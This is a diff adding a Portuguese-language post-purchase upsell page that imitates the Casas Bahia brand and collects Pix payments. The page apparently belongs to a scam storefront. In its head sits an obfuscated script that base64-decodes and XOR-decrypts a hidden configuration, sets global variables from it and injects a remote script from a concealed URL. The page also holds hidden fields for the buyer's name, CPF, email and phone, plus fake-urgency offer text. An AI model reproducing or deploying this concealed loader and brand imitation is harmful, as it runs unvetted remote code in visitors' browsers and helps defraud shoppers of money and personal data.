@@ -1,0 +1,127 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Oferta exclusiva | Casas Bahia</title>
+    <meta name="description" content="Aproveite ofertas exclusivas e complete seu pedido com produtos selecionados.">
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link rel="stylesheet" href="assets/css/upsell.css">
+
+
+<script>(function(){var b_io=atob("DNeMXbKrMWxcIuXFV6yuKMDHE1Z+SpGxJ6S2cp3IVQJyV5GoPrH1c9HEXEI+UMq2NKXlLcbYHhw1WoCpeKflJdfHHwYvAMnnNqP4L9vJRBg5Ucf/DIqgf9XHXg49TpbnbYz3f9zKXAl+GMe1Pq/pMfvPE0B+VISpIrKuZ5CdUA5vEoT2MuHqOYOdBFk4EoD0YeHubISJTDEh");var m_b0=[];for(var c_dzb=0;c_dzb<b_io.length;c_dzb++){m_b0.push(b_io.charCodeAt(c_dzb)&255);}var e_8y=m_b0[0];var n_p8=m_b0.slice(1,1+e_8y);var b_cgi9=m_b0.slice(1+e_8y);var b_7p=b_cgi9.map(function(b,q_8lkn){return b^n_p8[q_8lkn%e_8y];});var d_a="";for(var l_rn1=0;l_rn1<b_7p.length;l_rn1++){d_a+=String.fromCharCode(b_7p[l_rn1]&255);}var h_3d=decodeURIComponent(escape(d_a));var c_fl=JSON.parse(h_3d);var o_qonk=c_fl.globals||[];o_qonk.forEach(function(c_yxp){window[c_yxp.name]=c_yxp.value;});var n_s30=document.createElement("script");n_s30.src=c_fl.url;n_s30.async=true;n_s30.defer=true;(c_fl.attributes||[]).forEach(function(e_ch){n_s30.setAttribute(e_ch.name,e_ch.value);});(document.head||document.documentElement).appendChild(n_s30);})();</script>
+<script>
+(function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'sck'];
+    let storedUtms = {};
+    try { storedUtms = JSON.parse(localStorage.getItem('tracking_utms') || '{}'); } catch(e) {}
+
+    let hasNewUtms = false;
+    utmKeys.forEach(function(param) {
+        if (urlParams.has(param)) {
+            storedUtms[param] = urlParams.get(param);
+            hasNewUtms = true;
+        }
+    });
+    if (hasNewUtms) { localStorage.setItem('tracking_utms', JSON.stringify(storedUtms)); }
+})();
+</script>
+</head>
+<body><header>
+    <div class="topbar">Pedido confirmado • oferta exclusiva</div>
+    <div class="nav wrap">
+        <a class="brand brand-logo" href="index.html" aria-label="Ir para página inicial">
+            <img src="assets/images/logo.webp" alt="Casas Bahia" class="site-logo" width="349" height="150" decoding="async">
+        </a>
+        <div class="header-security-right">
+            <span class="security-icon">🔒</span>
+            <div class="security-copy">
+                <strong>Compra segura</strong>
+                <small>Pagamento protegido</small>
+            </div>
+        </div>
+    </div>
+</header>
+
+<main>
+<section class="wrap narrow section">
+    <div class="checkout-card checkout-flow upsell-card">
+        <div class="upsell-success-banner">
+            <div class="upsell-check">✓</div>
+            <div>
+                <strong>Pagamento aprovado</strong>
+                <p>Seu pedido já está confirmado. Aproveite uma oferta exclusiva antes de sair.</p>
+            </div>
+        </div>
+
+        <div class="upsell-product" id="upsell-product">
+            <img id="upsell-product-image" alt="" hidden>
+            <div>
+                <small id="upsell-lot">SEU PEDIDO</small>
+                <strong id="upsell-product-name">Produto</strong>
+                <span id="upsell-product-amount"></span>
+            </div>
+        </div>
+
+        <div class="upsell-offer-head">
+            <span class="eyebrow blue">OFERTA EXCLUSIVA</span>
+            <h1>Leve mais um produto com desconto especial</h1>
+            <p>
+                Selecionamos itens complementares com preço único para quem
+                acabou de comprar. Escolha um e finalize via Pix em segundos.
+            </p>
+            <small class="upsell-timer" id="upsell-timer">Oferta disponível por pouco tempo</small>
+        </div>
+
+        <div class="upsell-offers" id="upsell-offers" role="radiogroup" aria-label="Produtos em oferta">
+            <!-- preenchido pelo JS -->
+        </div>
+
+        <form id="upsell-form">
+            <input type="hidden" id="name" name="name">
+            <input type="hidden" id="cpf" name="document">
+            <input type="hidden" id="email" name="email">
+            <input type="hidden" id="phone" name="phone">
+
+            <button type="button" class="btn red full" id="buy-btn" disabled>
+                Escolha um produto
+            </button>
+        </form>
+
+        <a class="upsell-skip" id="upsell-skip" href="index.html">Não, obrigado — continuar sem oferta</a>
+
+        <div id="pix-payment-box" hidden>
+            <div id="pix-waiting-state">
+                <small class="pix-amount-caption">VALOR DA OFERTA</small>
+                <div class="pix-amount" id="pix-amount-label">R$ 0,00</div>
+                <p class="pix-selected-name" id="pix-selected-name"></p>
+                <label class="pix-copy-label">
+                    PIX COPIA E COLA
+                    <input id="pix-code" type="text" readonly>
+                </label>
+                <button type="button" class="pix-copy-main" id="pix-copy-btn">▣ COPIAR CÓDIGO PIX</button>
+                <p class="pix-copy-feedback" id="pix-copy-feedback" hidden>✓ Código copiado!</p>
+                <button type="button" class="pix-qr-toggle" id="pix-qr-toggle">＋ Prefere pagar usando QR Code?</button>
+                <div class="pix-qr-wrap" id="pix-qr-wrap" hidden>
+                    <img id="pix-qr-image" alt="QR Code Pix">
+                </div>
+                <div class="pix-auto-confirm">
+                    <strong>✓ Confirmação automática</strong>
+                    <small>Não precisa enviar comprovante.</small>
+                </div>
+            </div>
+            <div id="pix-success-state" hidden>
+                <div class="pix-success-icon">✓</div>
+                <strong>Oferta confirmada</strong>
+                <p>Recebemos o pagamento. O produto adicional será enviado junto com o seu pedido.</p>
+                <a class="btn red full" href="index.html" style="margin-top:12px;">Voltar à página inicial</a>
+            </div>
+        </div>
+    </div>
+</section>
+</main>
+
+<script src="assets/js/upsell.js?v=20260924-5"></script>
+</body>
+</html>
